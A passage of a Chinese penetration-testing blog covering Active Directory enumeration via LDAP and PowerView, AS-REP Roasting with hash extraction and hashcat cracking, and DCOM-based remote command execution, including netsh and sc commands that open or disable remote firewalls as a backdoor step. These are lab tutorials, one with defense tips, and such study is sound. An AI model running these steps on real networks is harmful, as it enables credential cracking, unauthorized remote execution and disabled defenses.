<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch -x -H ldap://192.168.1.1:389 -D "CN=testa,CN=Users,DC=test,DC=com" -w DomainUser123! -b "DC=test,DC=com" -b "DC=test,DC=com" "(&amp;(objectClass=user)(objectCategory=person))" CN | grep cn
</code></pre></div></div>

<p>结果输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/2-4.png" alt="Alt text"></p>

<h4 id="2查询所有计算机">(2)查询所有计算机</h4>

<p>加入搜索条件：<code class="language-plaintext highlighter-rouge">"(&amp;(objectCategory=computer)(objectClass=computer))"</code></p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch -x -H ldap://192.168.1.1:389 -D "CN=testa,CN=Users,DC=test,DC=com" -w DomainUser123! -b "DC=test,DC=com" -b "DC=test,DC=com" "(&amp;(objectCategory=computer)(objectClass=computer))" CN | grep cn
</code></pre></div></div>

<p>结果输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/2-5.png" alt="Alt text"></p>

<h4 id="3查询所有组">(3)查询所有组</h4>

<p>加入搜索条件：<code class="language-plaintext highlighter-rouge">"(&amp;(objectCategory=group))"</code></p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch -x -H ldap://192.168.1.1:389 -D "CN=testa,CN=Users,DC=test,DC=com" -w DomainUser123! -b "DC=test,DC=com" -b "DC=test,DC=com" "(&amp;(objectCategory=group))" CN | grep cn
</code></pre></div></div>

<p>结果输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/2-6.png" alt="Alt text"></p>

<h3 id="2windows系统通过powerview进行数据查询">2.Windows系统通过PowerView进行数据查询</h3>

<p>测试环境如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/3-1.png" alt="Alt text"></p>

<p>前提：我们能够访问到域控制器(DC)的389端口，并且我们至少已经获得了域内一个普通用户的口令</p>

<p>这个测试环境中，我们获得了域内普通用户<code class="language-plaintext highlighter-rouge">testa</code>的口令为<code class="language-plaintext highlighter-rouge">DomainUser123!</code></p>

<p>PowerView的地址：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</p>

<h4 id="1查询所有域用户-1">(1)查询所有域用户</h4>

<p>这里需要使用凭据信息，所以完整的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$uname="testa"                                                      
$pwd=ConvertTo-SecureString "DomainUser123!" -AsPlainText –Force                   
$cred=New-Object System.Management.Automation.PSCredential($uname,$pwd)        
Get-NetUser -Domain test.com -DomainController 192.168.1.1 -ADSpath "LDAP://DC=test,DC=com" -Credential $cred  
</code></pre></div></div>

<p>为了便于统计名称，可以选择只列出name项，完整命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$uname="testa"                                                      
$pwd=ConvertTo-SecureString "DomainUser123!" -AsPlainText –Force                   
$cred=New-Object System.Management.Automation.PSCredential($uname,$pwd)        
Get-NetUser -Domain test.com -DomainController 192.168.1.1 -ADSpath "LDAP://DC=test,DC=com" -Credential $cred | fl name
</code></pre></div></div>

<p>结果输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/3-2.png" alt="Alt text"></p>

<h4 id="2查询所有计算机-1">(2)查询所有计算机</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$uname="testa"                                                      
$pwd=ConvertTo-SecureString "DomainUser123!" -AsPlainText –Force                   
$cred=New-Object System.Management.Automation.PSCredential($uname,$pwd)        
Get-NetComputer -Domain test.com -DomainController 192.168.1.1 -ADSpath "LDAP://DC=test,DC=com" -Credential $cred | fl name
</code></pre></div></div>

<p>结果输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/3-3.png" alt="Alt text"></p>

<h4 id="3查询所有组-1">(3)查询所有组</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$uname="testa"                                                      
$pwd=ConvertTo-SecureString "DomainUser123!" -AsPlainText –Force                   
$cred=New-Object System.Management.Automation.PSCredential($uname,$pwd)        
Get-NetGroup -Domain test.com -DomainController 192.168.1.1 -ADSpath "LDAP://DC=test,DC=com" -Credential $cred | fl name
</code></pre></div></div>

<p>结果输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/3-4.png" alt="Alt text"></p>

<h2 id="0x04-域内获取活动目录信息的方法">0x04 域内获取活动目录信息的方法</h2>
<hr>

<p>前提是已经获得了域内一台主机的权限</p>

<p>测试环境如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/4-1.png" alt="Alt text"></p>

<p>原理：通过ADSI(ActiveDirectoryServicesInterface)（活动目录服务接口）进行LDAP查询，获得结果</p>

<h3 id="1使用powershell实现">1.使用Powershell实现</h3>

<p>参照PowerView，地址：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</p>

<h3 id="2使用c实现">2.使用C#实现</h3>

<p>参照SharpView，地址：</p>

<p>https://github.com/tevora-threat/SharpView</p>

<h3 id="3使用c实现">3.使用C++实现</h3>

<p>参考地址：</p>

<p>https://github.com/microsoft/Windows-classic-samples/tree/master/Samples/Win7Samples/netds/adsi/activedir/QueryUsers/vc</p>

<p>https://github.com/outflanknl/Recon-AD</p>

<p>微软的代码是exe的格式，只介绍了QueryUser的方法，但支持查询条件（筛选指定用户）和显示简要信息（只输出名称，便于统计）</p>

<p>Recon-AD的代码是dll的格式，包含多个功能，但默认只显示详细信息</p>

<p>于是我将两者的代码融合，代码支持以下功能：</p>

<ul>
  <li>exe的格式</li>
  <li>包含多个功能，支持查询用户、计算机和组等</li>
  <li>支持查询条件和显示简要信息</li>
</ul>

<p>代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/QueryADObject.cpp</p>

<p>代码可指定ADS path和搜索条件，用法如下：</p>

<h4 id="1查询域用户">(1)查询域用户</h4>

<p>列出所有域用户，只显示简要的名称信息，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryADObject.exe Current "(&amp;(objectClass=user)(objectCategory=person))" ShortData
</code></pre></div></div>

<p>结果输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/5-1.png" alt="Alt text"></p>

<p>查询指定用户的所有信息，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryADObject.exe Current "(&amp;(objectClass=user)(objectCategory=person)(name=testa))" AllData
</code></pre></div></div>

<p>结果输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/5-2.png" alt="Alt text"></p>

<h4 id="2查询计算机">(2)查询计算机</h4>

<p>列出所有计算机账户，只显示简要的名称信息，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryADObject.exe Current "(&amp;(objectCategory=computer)(objectClass=computer))" ShortData
</code></pre></div></div>

<p>结果输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/5-3.png" alt="Alt text"></p>

<p>查询域控制器的详细信息，需要知道ADS path为<code class="language-plaintext highlighter-rouge">"OU=Domain Controllers,DC=test,DC=com"</code>，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryADObject.exe "OU=Domain Controllers,DC=test,DC=com" "(&amp;(objectCategory=computer)(objectClass=computer))" AllData
</code></pre></div></div>

<p>结果输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/5-4.png" alt="Alt text"></p>

<h4 id="3查询组">(3)查询组</h4>

<p>列出所有组，只显示简要的名称信息，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryADObject.exe Current "(&amp;(objectCategory=group))" ShortData
</code></pre></div></div>

<p>列出管理员组的详细信息，命令如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryADObject.exe Current "(&amp;(objectCategory=group)(name=Domain Admins))" Alldata
</code></pre></div></div>

<p>结果输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/5-5.png" alt="Alt text"></p>

<h4 id="4查询ou">(4)查询OU</h4>

<p>列出所有OU，只显示简要的名称信息，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryADObject.exe Current "(&amp;(objectCategory=organizationalUnit))" ShortData
</code></pre></div></div>

<p>结果输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/5-6.png" alt="Alt text"></p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文以获取活动目录中所有用户、所有计算机和所有组为例，分别介绍了从域外和域内获取信息的方法。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December 12, 2019
  </div>

  
</article><article class="post">
  <h1>域渗透——AS-REPRoasting</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>AS-REP Roasting同Kerberoasting类似，如果满足条件，就能够获得用户口令的hash，再结合hashcat进行破解，最后能够还原出用户的明文口令。</p>

<p>本文将要参考公开资料，结合自己的理解，介绍AS-REP Roasting的利用方法，最后给出防御建议。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>AS-REP Roasting的原理</li>
  <li>AS-REP Roasting的利用条件</li>
  <li>AS-REP Roasting的利用方法</li>
  <li>破解hash的方法</li>
  <li>防御建议</li>
</ul>

<h2 id="0x02-as-rep-roasting">0x02 AS-REP Roasting</h2>
<hr>

<h3 id="1简介">1.简介</h3>

<p>对于域用户，如果设置了选项”Do not require Kerberos preauthentication”，此时向域控制器的88端口发送AS-REQ请求，对收到的AS-REP内容重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令</p>

<h3 id="2利用前提">2.利用前提</h3>

<p>域用户设置了选项”Do not require Kerberos preauthentication”</p>

<p>通常情况下，该选项默认不会开启</p>

<h3 id="3利用思路">3.利用思路</h3>

<p>通常在域渗透中用来维持权限</p>

<p>需要先获得对指定用户的GenericWrite权限，利用思路如下：</p>

<ol>
  <li>开启用户选项”Do not require Kerberos preauthentication”</li>
  <li>导出hash并破解</li>
  <li>关闭用户选项”Do not require Kerberos preauthentication”</li>
</ol>

<h2 id="0x03-as-rep-roasting的利用方法">0x03 AS-REP Roasting的利用方法</h2>
<hr>

<h3 id="1寻找满足条件的用户">1.寻找满足条件的用户</h3>

<p>用户需要开启选项”Do not require Kerberos preauthentication”</p>

<p>这里可以使用LDAP查询满足条件(userAccountControl:1.2.840.113556.1.4.803:=4194304)的用户</p>

<p>参考资料：</p>

<p>https://support.microsoft.com/en-us/help/305144/how-to-use-useraccountcontrol-to-manipulate-user-account-properties</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/445f7b2510c4553dcd9451bc4daccb20c8e67cbb/Recon/PowerView.ps1#L4769</p>

<p>DONT_REQ_PREAUTH项对应的值为4194304</p>

<p>PowerView的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired -Verbose
</code></pre></div></div>

<p>示例如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-18/2-1.png" alt="Alt text"></p>

<p>只显示distinguishedname项：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
</code></pre></div></div>

<p>示例如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-18/2-2.png" alt="Alt text"></p>

<h3 id="2开启和关闭选项do-not-require-kerberos-preauthentication">2.开启和关闭选项”Do not require Kerberos preauthentication”</h3>

<p>开启选项意味着对用户添加属性(userAccountControl=4194304)</p>

<p>开启选项的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerView.ps1
Set-DomainObject -Identity testb -XOR @{userAccountControl=4194304} -Verbose
</code></pre></div></div>

<p>关闭选项意味着删除用户属性(userAccountControl=4194304)</p>

<p><strong>注：</strong></p>

<p>这里可以再次进行异或运算，两次异或相当于不改变原数值，即删除用户属性(userAccountControl)</p>

<p>关闭选项的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerView.ps1
Set-DomainObject -Identity testb -XOR @{userAccountControl=4194304} -Verbose
</code></pre></div></div>

<h3 id="3导出hash">3.导出hash</h3>

<h4 id="1使用powershell">(1)使用Powershell</h4>

<p>https://github.com/HarmJ0y/ASREPRoast</p>

<p>导出所有可用用户hash的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\ASREPRoast.ps1
Invoke-ASREPRoast -Verbose |fl
</code></pre></div></div>

<p>示例如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-18/3-1.png" alt="Alt text"></p>

<p>导出指定用户hash的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ASREPHash -UserName testb -Verbose
</code></pre></div></div>

<p>示例如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-18/3-2.png" alt="Alt text"></p>

<p>提取出hash：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$krb5asrep$testb@test.com:a128092441a3af80015554db2f3fe44e$d69b44c7d9cf36261a012d012f636a2124837af89a48ef686e1ac7572af93741fc801423443a85c9aacd6a5f85f1d840d07b09e68795ce691a818fa765674c3f25492ed49e7274d98096d599c9ff0de6e169efdb3429cde39dbdea4633580981bcb34ecf330d0cb2cb194e2944f77b8fc15c056684fee33d3ee7e0b86bc56072c3bfcd2d3abeb06bfb42144a06cf90c5c60e9c255d93d9c62bbf1cc37e75d8f6d22120bf8de673db20f108da96a9e3d9d099346fff8619f49961feeaf96c35eb1a237b42b6716012dfc08d96146eb1df65e9a66a67685c04f8ab7e21bfa36800babc1ad3
</code></pre></div></div>

<h4 id="2使用crubeus">(2)使用C#(Rubeus)</h4>

<p>https://github.com/GhostPack/Rubeus</p>

<p>命令如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Rubeus.exe asreproast
</code></pre></div></div>

<p>示例如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-18/3-3.png" alt="Alt text"></p>

<h3 id="4使用hashcat进行破解">4.使用hashcat进行破解</h3>

<p>提取出hash：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$krb5asrep$testb@test.com:a128092441a3af80015554db2f3fe44e$d69b44c7d9cf36261a012d012f636a2124837af89a48ef686e1ac7572af93741fc801423443a85c9aacd6a5f85f1d840d07b09e68795ce691a818fa765674c3f25492ed49e7274d98096d599c9ff0de6e169efdb3429cde39dbdea4633580981bcb34ecf330d0cb2cb194e2944f77b8fc15c056684fee33d3ee7e0b86bc56072c3bfcd2d3abeb06bfb42144a06cf90c5c60e9c255d93d9c62bbf1cc37e75d8f6d22120bf8de673db20f108da96a9e3d9d099346fff8619f49961feeaf96c35eb1a237b42b6716012dfc08d96146eb1df65e9a66a67685c04f8ab7e21bfa36800babc1ad3
</code></pre></div></div>

<p>拼接成hashcat能够识别的格式需要在<code class="language-plaintext highlighter-rouge">$krb5asrep</code>后面添加<code class="language-plaintext highlighter-rouge">$23</code></p>

<p>hashcat使用字典破解的参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 18200 '$krb5asrep$23$testb@test.com:a128092441a3af80015554db2f3fe44e$d69b44c7d9cf36261a012d012f636a2124837af89a48ef686e1ac7572af93741fc801423443a85c9aacd6a5f85f1d840d07b09e68795ce691a818fa765674c3f25492ed49e7274d98096d599c9ff0de6e169efdb3429cde39dbdea4633580981bcb34ecf330d0cb2cb194e2944f77b8fc15c056684fee33d3ee7e0b86bc56072c3bfcd2d3abeb06bfb42144a06cf90c5c60e9c255d93d9c62bbf1cc37e75d8f6d22120bf8de673db20f108da96a9e3d9d099346fff8619f49961feeaf96c35eb1a237b42b6716012dfc08d96146eb1df65e9a66a67685c04f8ab7e21bfa36800babc1ad3' /usr/share/john/password.lst -o found.txt --force
</code></pre></div></div>

<p>参数说明：</p>

<p><code class="language-plaintext highlighter-rouge">/usr/share/john/password.lst</code>为字典文件的位置
<code class="language-plaintext highlighter-rouge">-o found.txt</code>表示输出结果的位置</p>

<h2 id="0x04-防御建议">0x04 防御建议</h2>
<hr>

<p>1.确保域内不存在开启”Do not require Kerberos preauthentication”的用户</p>

<p>扫描方法(使用PowerView)：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired -Verbose
</code></pre></div></div>

<p>2.域用户强制使用复杂口令，提高被字典和暴力破解的难度</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了AS-REP Roasting在域渗透中的利用条件和方法，给出防御建议</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on July 18, 2019
  </div>

  
</article><article class="post">
  <h1>域渗透——利用DCOM在远程系统执行程序</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在以前的文章《在远程系统上执行程序的技术整理》整理过域环境下常用的程序执行方法：at、psexec、WMIC、wmiexec、smbexec和powershell remoting，这次将基于Matt Nelson‏ @enigma0x3的研究，详细介绍在域环境下使用DCOM执行程序的方法，分析相关攻防思路。</p>

<p>学习链接如下：</p>

<p>https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/</p>

<p>https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>DCOM使用介绍</li>
  <li>实际利用思路</li>
  <li>命令行配置防火墙的技巧</li>
  <li>防御思路</li>
</ul>

<h2 id="0x02-dcom使用介绍">0x02 DCOM使用介绍</h2>
<hr>

<p>相关基础知识暂略，关于DCOM的介绍可参考如下链接：</p>

<p>https://msdn.microsoft.com/en-us/library/cc226801.aspx</p>

<p>http://blog.csdn.net/ervinsas/article/details/36424127</p>

<p>本节主要选取Matt Nelson‏ @enigma0x3博客中的主要利用方法进行复现</p>

<p><strong>获得DCOM的程序列表：</strong></p>

<p>powershell代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-CimInstance Win32_DCOMApplication
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>Get-CimInstance只适用于Powershell 3.0及以上，Win7默认为2.0不支持，可使用以下替代命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
</code></pre></div></div>

<p>当然，直接使用wmic查询也可以，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_DCOMApplication  GET /all /FORMAT:list
</code></pre></div></div>

<p>powershell对WMI的调用可使用wmic命令进行替换，详情可参考：</p>

<p>https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe/</p>

<h3 id="1对本机测试">1、对本机测试</h3>

<p>管理员权限，powershell代码如下:</p>

<p>获得<code class="language-plaintext highlighter-rouge">"MMC20.Application"</code>支持的操作：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","127.0.0.1"))
$com.Document.ActiveView | Get-Member
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-15/2-1.png" alt="Alt text"></p>

<p>查看ExecuteShellCommand对应的参数说明：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$com.Document.ActiveView.ExecuteShellCommand
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-15/2-2.png" alt="Alt text"></p>

<p>ExecuteShellCommand对应的参数具体含义可参考以下链接：</p>

<p>https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx</p>

<p>通过ExecuteShellCommand执行程序：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","127.0.0.1"))
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimized")
</code></pre></div></div>

<h3 id="2对远程系统测试">2、对远程系统测试</h3>

<p>测试环境：域环境</p>

<p>Client：关闭防火墙</p>

<p>Server：获得域主机内置帐户administrator的口令，可net use连接至Client</p>

<p>Server端管理员权限可选择执行如下powershell代码：</p>

<p><strong>1.调用MMC20.Application</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.0.2"))
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimized")
</code></pre></div></div>

<p>操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-15/2-3.png" alt="Alt text"></p>

<p>Clinet端查看程序列表，启动的calc.exe用户名为test2(Client端当前登录用户为a)，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-15/2-4.png" alt="Alt text"></p>

<p><strong>2.调用’9BA05972-F6A8-11CF-A442-00A0C90A8F39’</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"192.168.0.2")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)
</code></pre></div></div>

<p>Clinet端查看程序列表，启动的calc.exe用户名为a（同Client端当前登录用户名相同），如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-15/2-5.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>以上两种方式适用于Win7-Win10</p>

<p><strong>3.调用’C08AFD90-F2A1-11D1-8455-00A0C91F3880’</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"192.168.0.2")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute("cmd.exe","/c calc.exe","c:\windows\system32",$null,0)
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>该方法不适用于Win7，适用于Win10和Server2012 R2</p>

<h2 id="0x03-实际利用思路">0x03 实际利用思路</h2>
<hr>

<h3 id="思路一域环境未开启防火墙直接使用">思路一：域环境未开启防火墙，直接使用</h3>

<p>当然，需要获得域内置帐户administrator的口令</p>

<p>方法不再赘述</p>

<h3 id="思路二默认开启防火墙本地修改配置关闭防火墙">思路二：默认开启防火墙，本地修改配置关闭防火墙</h3>

<p>这样，其他主机就可以远程操作该主机，可<strong>分别</strong>通过以下方式实现</p>

<p><strong>1、通过配置入站规则支持DCOM</strong></p>

<p>命令行开启任意端口的代码如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall firewall add rule name="any" protocol=TCP dir=in localport=any action=allow
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>DCOM通信端口是由RPC动态分配，不固定，所以将入站端口规则设置为any</p>

<p>添加后，防火墙高级功能面板能发现添加的入站规则，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-15/2-6.png" alt="Alt text"></p>

<p><strong>2、关闭防火墙功能</strong></p>

<p>Windows Firewall对应的服务名为mpssvc，使用sc命令可远程关闭防火墙服务，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc \\192.168.0.2 stop mpssvc
</code></pre></div></div>

<p>但关闭防火墙服务并不能关闭防火墙功能，需要使用如下命令关闭防火墙功能：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall set currentprofile state off
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>补充开启防火墙功能的命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall set currentprofile state on
</code></pre></div></div>

<p><strong>3、通过防火墙配置文件设置入站规则</strong></p>

<p>防火墙默认配置规则如下：</p>

<ul>
  <li>阻止与规则不匹配的入站连接</li>
  <li>允许与规则不匹配的出站连接</li>
</ul>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-15/2-7.png" alt="Alt text"></p>

<p>修改规则，允许与规则不匹配的入站连接，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall set currentprofile firewallpolicy allowinbound,allowoutbound
</code></pre></div></div>

<p>修改后，通过高级面板能够看到修改后的配置，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-15/3-1.png" alt="Alt text"></p>

<p>此时,防火墙状态报警，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-15/3-2.png" alt="Alt text"></p>

<p>还原防火墙配置的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall set currentprofile firewallpolicy blockinbound,allowoutbound
</code></pre></div></div>

<h3 id="思路三远程修改防火墙配置">思路三：远程修改防火墙配置</h3>

<p>可使用netsh远程配置防火墙规则，需要知道用户名密码，管理员权限执行如下命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh -r 192.168.0.2 -u TEST\administrator -p domain123! advfirewall set currentprofile firewallpolicy allowinbound,allowoutbound
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>对当前配置文件(即域配置文件)：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall set currentprofile settings remotemanagement enable
</code></pre></div></div>

<p>所有配置文件可以使用：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall set allprofiles settings remotemanagement enable 
</code></pre></div></div>

<p>报错如下：</p>

<p><code class="language-plaintext highlighter-rouge">An error occurred while attempting to connect to the remote computer. Make sure
that the Windows Firewall service on the remote computer is running and configur
ed to allow remote management, and then try your request again.</code></p>

<p>说明远程计算机不允许远程管理，远程计算机需要作如下设置：</p>

<p><strong>允许Windows防火墙远程管理</strong></p>

<p>默认不支持，选中打勾代表开启，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-15/4-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>该操作可通过命令行实现，本地管理员权限执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall set currentprofile settings remotemanagement enable
</code></pre></div></div>

<p>该功能打开后，其他主机可远程管理本机防火墙配置：</p>

<p>（管理员权限）</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh -r 192.168.0.2 -u TEST\administrator -p domain123! advfirewall firewall add rule name="any" protocol=TCP dir=in localport=any action=allow
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-15/4-2.png" alt="Alt text"></p>

<p>综上，利用DCOM在域控远程执行程序的思路如下：</p>

<p><strong>1、获取域控权限</strong></p>

<p>包括域控内置帐户administrator的口令，如果域控防火墙关闭，可直接远程执行程序</p>

<p><strong>注：</strong></p>

<p>如果想使用其他帐户远程连接，需要先通过dcomcnfg.exe进入COM安全，激活用户的远程启动和远程激活属性</p>

<p><strong>2、预置后门</strong></p>

<p>如果域控开启防火墙，无法直接使用DCOM远程执行，需要获得远程修改防火墙配置的权限，该权限可通过设置<code class="language-plaintext highlighter-rouge">允许Windows防火墙远程管理</code>（系统默认关闭）获得</p>

<p>该操作需要3389连接域控或是使用其他方法在域控主机上执行代码，管理员权限执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh advfirewall set currentprofile settings remotemanagement enable
</code></pre></div></div>

<p><strong>3、远程打开端口</strong></p>

<p>使用netsh远程修改域控防火墙规则，打开端口</p>

